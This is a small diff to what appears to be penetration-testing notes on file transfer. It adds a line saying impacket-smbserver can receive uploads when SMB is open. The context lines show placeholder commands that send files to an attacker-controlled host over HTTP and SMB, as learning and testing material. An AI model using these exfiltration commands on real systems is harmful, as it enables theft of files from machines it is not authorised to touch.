@@ -201,6 +201,7 @@ Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
 # You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \<IP>\sharefolder
   copy <FILE PATH> \\<IP>\sharefolder\
   ```
+If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
   </details>
   </details>
 </details>
